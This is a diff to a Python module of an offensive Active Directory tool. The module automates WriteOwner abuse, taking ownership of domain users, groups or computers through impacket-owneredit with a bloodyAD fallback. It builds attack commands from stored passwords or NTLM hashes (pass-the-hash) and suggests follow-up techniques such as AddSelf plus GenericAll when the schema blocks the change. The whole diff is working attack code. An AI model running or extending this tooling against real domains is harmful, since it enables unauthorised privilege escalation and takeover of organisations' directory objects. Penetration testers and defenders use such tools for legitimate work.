@@ -4,7 +4,7 @@ from core.helpers import run_command, select_from_list, get_bloodyad_auth
 
 
 def attack_write_owner(session, *parts):
-    print(blue("[*] Attempting to set object owner using bloodyAD..."))
+    print(blue("[*] Attempting to set object owner using impacket-owneredit..."))
 
     target_object = parts[0] if len(parts) >= 1 else None
     new_owner = parts[1] if len(parts) >= 2 else None
@@ -13,33 +13,13 @@ def attack_write_owner(session, *parts):
         target_object = _prompt_object("Select target object (user/group/computer):")
 
     if not new_owner:
-        new_owner = _prompt_object("Select new owner (user/group):")
+        new_owner = _prompt_object("Select new owner SAM (user/group):")
 
-    # === Use short names only for bloodyAD
-    success = _attempt_bloodyad(session, target_object, new_owner)
+    # === Try Impacket first
+    success = _attempt_owneredit(session, target_object, new_owner, fallback=True)
     if not success:
-        # === Only then resolve DNs and fallback
-        _attempt_owneredit(session, target_object, new_owner, fallback=True)
-
-
-def _attempt_bloodyad(session, target_object, new_owner):
-    auth = get_bloodyad_auth(session)
-    cmd = (
-        f"bloodyAD --host {session.dc_ip} -d {session.domain} {auth} "
-        f"set owner \"{target_object}\" \"{new_owner}\""
-    )
-
-    print(blue(f"[*] Running: {cmd}"))
-    out, err = run_command(cmd)
-    combined = out + "\n" + err
-
-    if "success" in combined.lower() or "owner" in combined.lower():
-        print(green("[+] WriteOwner succeeded via bloodyAD:\n"))
-        print(green(out.strip()))
-        return True
-
-    print(red("[-] bloodyAD WriteOwner failed. Will fallback to impacket-owneredit..."))
-    return False
+        # === Fallback to bloodyAD
+        _attempt_bloodyad(session, target_object, new_owner)
 
 
 def _attempt_owneredit(session, target_object, new_owner, fallback=False):
@@ -47,20 +27,23 @@ def _attempt_owneredit(session, target_object, new_owner, fallback=False):
         auth = f"{session.domain}/{session.username} -hashes :{session.hash}"
     elif session.password:
         auth = f"{session.domain}/{session.username}:{session.password}"
+    else:
+        print(red("[-] No valid credentials for impacket-owneredit."))
+        return False
 
     cmd = (
         f"impacket-owneredit -action write -new-owner \"{new_owner}\" "
         f"-target \"{target_object}\" {auth} -dc-ip {session.dc_ip}"
     )
 
-    print(blue(f"[*] Running fallback: {cmd}"))
+    print(blue(f"[*] Running impacket-owneredit: {cmd}"))
     out, err = run_command(cmd)
     combined = out + "\n" + err
 
     if any(x in combined.lower() for x in ["owner set", "successfully", "modified"]):
-        print(green("[+] Fallback WriteOwner succeeded:\n"))
+        print(green("[+] WriteOwner succeeded via impacket-owneredit:\n"))
         print(green(out.strip()))
-        return
+        return True
 
     if "Current owner information below" in combined:
         print(yellow("[*] Current owner information below"))
@@ -71,20 +54,43 @@ def _attempt_owneredit(session, target_object, new_owner, fallback=False):
     if "0000051B" in combined or "constraint_att_type" in combined.lower():
         print(red("[-] WriteOwner blocked by AD schema constraint (error 0000051B)."))
         print(yellow("[!] Try AddSelf + GenericAll or shadow group techniques."))
-        return
+        return False
 
-    print(red("[!] Fallback WriteOwner failed."))
+    print(red("[!] impacket-owneredit failed."))
 
     if fallback:
         print(yellow("[*] Attempting fallback by resolving both values to full DNs..."))
         resolved_target = _resolve_to_dn(target_object)
         resolved_owner = _resolve_to_dn(new_owner)
         if resolved_target and resolved_owner:
-            _attempt_owneredit(session, resolved_target, resolved_owner, fallback=False)
+            return _attempt_owneredit(session, resolved_target, resolved_owner, fallback=False)
         else:
             print(red("[-] Could not resolve to full DNs. Aborting."))
+            return False
     else:
         print(red(err if err else out))
+        return False
+
+
+def _attempt_bloodyad(session, target_object, new_owner):
+    auth = get_bloodyad_auth(session)
+    cmd = (
+        f"bloodyAD --host {session.dc_ip} -d {session.domain} {auth} "
+        f"set owner \"{target_object}\" \"{new_owner}\""
+    )
+
+    print(blue(f"[*] Running bloodyAD: {cmd}"))
+    out, err = run_command(cmd)
+    combined = out + "\n" + err
+
+    if "success" in combined.lower() or "owner" in combined.lower():
+        print(green("[+] WriteOwner succeeded via bloodyAD:\n"))
+        print(green(out.strip()))
+        return True
+
+    print(red("[-] bloodyAD WriteOwner failed."))
+    print(red(err if err else out))
+    return False
 
 
 # ===================
@@ -97,7 +103,7 @@ def _prompt_object(prompt_msg):
     candidates = users + groups
 
     if not candidates:
-        return input("[?] Enter short name or DN: ").strip()
+        return input("[?] Enter SAM name : ").strip()
 
     return select_from_list(candidates, "Choose object:")
 
